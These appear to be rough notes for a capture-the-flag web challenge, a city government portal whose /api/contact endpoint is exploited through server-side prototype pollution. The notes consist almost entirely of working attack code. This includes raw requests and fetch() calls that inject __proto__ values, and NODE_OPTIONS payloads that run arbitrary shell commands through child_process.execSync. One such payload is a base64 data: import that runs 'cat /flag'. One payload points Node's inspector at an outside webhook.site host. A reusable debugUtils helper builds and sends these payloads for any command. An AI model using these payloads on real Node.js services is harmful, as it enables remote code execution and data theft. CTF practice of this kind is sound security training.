
web easy


Utopia City has deployed a government portal for citizens to contact city officials and access services.





![[Pasted image 20251026130624.png]]


Adding new attribute:

```
POST /api/contact HTTP/1.1
Host: 81e10d75ce1af9c3.chal.ctf.ae
Content-Length: 174
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Sec-Ch-Ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"
Content-Type: application/json
Accept: */*
Origin: https://81e10d75ce1af9c3.chal.ctf.ae
Referer: https://81e10d75ce1af9c3.chal.ctf.ae/contact
Connection: keep-alive

{"name":"test","email":"test@test.com","message":"test","department":"general","config":{"department":"general","priority":"normal",
"__proto__":{"Polluting": "Prototype"}}}
```

![[Pasted image 20251026131212.png]]

```
{"name":"test","email":"test@test.com","message":"test","department":"general", "config": {
                "__proto__": {
                    "env": {
                        "EVIL": "`console.log(require('child_process').execSync('${command}').toString())//`"
                    },
                    "NODE_OPTIONS": "--require /proc/self/environ"
                }
            }}
```


```
               "__proto__": {
                    "argv0": "console.log(require('child_process').execSync('${command}').toString())//",
                    "NODE_OPTIONS": "--require /proc/self/cmdline"
                    }
```



```
// Step 1: Pollute isAdmin AND set NODE_OPTIONS
fetch('/api/contact', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        name: "Eve",
        email: "eve@system.invalid",
        message: "Triggering exploit",
        department: "general",
        isAdmin: true,
        __proto__: {
            NODE_OPTIONS: "--import=data:text/javascript;base64,cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgL2ZsYWcnKTs="
        }
    })
})
.then(() => {
    console.log("Payload sent. Trying to get system info...");
    return getSystemInfo();
})
.catch(err => console.error("Exploit failed:", err));
```


```
fetch('/api/contact', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        name: "Alice",
        email: "alice@utopia.gov",
        message: "Please help",
        department: "general",
        "config":{
	        __proto__: {
			    "isAdmin": true
			}
        }
    })
})
.then(r => r.json())
.then(console.log);
```

```
fetch('/api/admin/system');
```


```
// Step 1: Trigger RCE via prototype pollution and NODE_OPTIONS
await debugUtils.testPP2RCE("cat /flag", "import");

// Step 2: Wait 1 second for server-side effect (child process or error)
await new Promise(resolve => setTimeout(resolve, 1000));

// Step 3: Try to access admin endpoint and capture raw response
console.log('Fetching /api/admin/system to check for flag or error leak...');

try {
    const response = await fetch('/api/admin/system');
    console.log('Status:', response.status);

    const text = await response.text();
    console.log('Raw response:', text);

    // Try to parse as JSON if possible
    try {
        const json = JSON.parse(text);
        console.log('Parsed as JSON:', json);
    } catch (e) {
        console.log('Response is not JSON — likely HTML error page');
    }

    // Search for flag pattern
    const flagMatch = text.match(/(flag\{[^}]+\})/);
    if (flagMatch) {
        console.log('🎉 FLAG FOUND:', flagMatch[1]);
        alert('FLAG FOUND: ' + flagMatch[1]);
    } else {
        console.log('No flag pattern found. Try other methods.');
    }
} catch (err) {
    console.error('Fetch failed:', err);
}
```


```
`"__proto__": { "shell":"node", "NODE_OPTIONS":"--inspect=https://webhook.site/032aab82-eb52-4d6b-9b75-0b70f89d1743" }`
```

https://webhook.site/032aab82-eb52-4d6b-9b75-0b70f89d1743


```
            name: "Security Researcher",
            email: "researcher@security.com",
            message: "Testing PP2RCE vulnerability",
            config: {
                "__proto__": {
                    "NODE_OPTIONS": `--import data:text/javascript;base64,${base64Payload}`
                }
            }
        };
```


```
  "__proto__": {       "argv0":"node",       "shell":"node",       "NODE_OPTIONS":"--inspect=https://webhook.site/032aab82-eb52-4d6b-9b75-0b70f89d1743"     }
```


```
            name: "Security Researcher",
            email: "researcher@security.com",
            message: "Testing PP2RCE vulnerability",
            config: {
                "__proto__": {
                    "NODE_OPTIONS": `--import data:text/javascript;base64,${base64Payload}`
                }
```


```
                "__proto__": {
                    "argv0": `console.log(require('child_process').execSync('${command}').toString())//`,
                    "NODE_OPTIONS": "--require /proc/self/cmdline"
```




```
window.debugUtils = {
    // Helper function to create NODE_OPTIONS based PP2RCE payload
    createPP2RCEPayload: function (command) {
        // Method 1: Using NODE_OPTIONS with --import for modern Node.js (19+)
        const jsPayload = `require('child_process').execSync('${command}')`;
        const base64Payload = Buffer.from(jsPayload).toString('base64');

        return {
            name: "Security Researcher",
            email: "researcher@security.com",
            message: "Testing PP2RCE vulnerability",
            config: {
                "__proto__": {
                    "NODE_OPTIONS": `--import data:text/javascript;base64,${base64Payload}`
                }
            }
        };
    },

    // Alternative payload using env vars
    createEnvPP2RCEPayload: function (command) {
        return {
            name: "Security Researcher",
            email: "researcher@security.com",
            message: "Testing PP2RCE via env vars",
            config: {
                "__proto__": {
                    "env": {
                        "EVIL": `console.log(require('child_process').execSync('${command}').toString())//`
                    },
                    "NODE_OPTIONS": "--require /proc/self/environ"
                }
            }
        };
    },

    // Alternative payload using cmdline
    createCmdlinePP2RCEPayload: function (command) {
        return {
            name: "Security Researcher",
            email: "researcher@security.com",
            message: "Testing PP2RCE via cmdline",
            config: {
                "__proto__": {
                    "argv0": `console.log(require('child_process').execSync('${command}').toString())//`,
                    "NODE_OPTIONS": "--require /proc/self/cmdline"
                }
            }
        };
    },

    // Helper function to test prototype pollution
    testPP2RCE: async function (command, method = 'import') {
        let payload;

        switch (method) {
            case 'import':
                payload = this.createPP2RCEPayload(command);
                break;
            case 'env':
                payload = this.createEnvPP2RCEPayload(command);
                break;
            case 'cmdline':
                payload = this.createCmdlinePP2RCEPayload(command);
                break;
            default:
                payload = this.createPP2RCEPayload(command);
        }

        try {
            console.log('Sending PP2RCE payload:', JSON.stringify(payload, null, 2));

            const response = await fetch('/api/contact', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();
            console.log('PP2RCE test result:', result);

            // Test if pollution worked
            if (process.env.NODE_ENV !== 'production') {
                setTimeout(async () => {
                    try {
                        const pollutionTest = await fetch('/api/debug/test-pollution', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' }
                        });
                        const pollutionResult = await pollutionTest.json();
                        console.log('Pollution check:', pollutionResult);
                    } catch (e) {
                        console.log('Pollution check failed (endpoint may not exist in production)');
                    }
                }, 500);
            }

            return result;
        } catch (error) {
            console.error('PP2RCE test error:', error);
            return null;
        }
    },

    // Test basic prototype pollution without RCE
    testBasicPollution: async function () {
        const payload = {
            name: "Test User",
            email: "test@example.com",
            message: "Testing basic prototype pollution",
            config: {
                "__proto__": {
                    "polluted": true,
                    "testValue": "This proves prototype pollution works"
                }
            }
        };

        try {
            const response = await fetch('/api/contact', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();

            // Check if pollution worked
            const testObj = {};
            console.log('Basic pollution test:');
            console.log('testObj.polluted:', testObj.polluted);
            console.log('testObj.testValue:', testObj.testValue);
            console.log('({}).polluted:', ({}).polluted);

            return result;
        } catch (error) {
            console.error('Basic pollution test error:', error);
            return null;
        }
    }
};

// Development helper (remove in production)
if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
    console.log('🔧 Development mode detected');
    console.log('💡 Hint: Check the /api/contact endpoint for prototype pollution vulnerabilities');
    console.log('🎯 Try using these commands in the console:');
    console.log('   debugUtils.testBasicPollution() - Test basic prototype pollution');
    console.log('   debugUtils.testPP2RCE("whoami") - Test PP2RCE with whoami command');
    console.log('   debugUtils.testPP2RCE("echo $FLAG", "import") - Get flag using --import method');
    console.log('   debugUtils.testPP2RCE("echo $FLAG", "env") - Get flag using env method');
    console.log('   debugUtils.testPP2RCE("echo $FLAG", "cmdline") - Get flag using cmdline method');
    console.log('');
    console.log('🔍 PP2RCE Methods available:');
    console.log('   - "import": NODE_OPTIONS with --import (Node 19+, filesystem-less)');
    console.log('   - "env": NODE_OPTIONS with --require /proc/self/environ');
    console.log('   - "cmdline": NODE_OPTIONS with --require /proc/self/cmdline');
}
```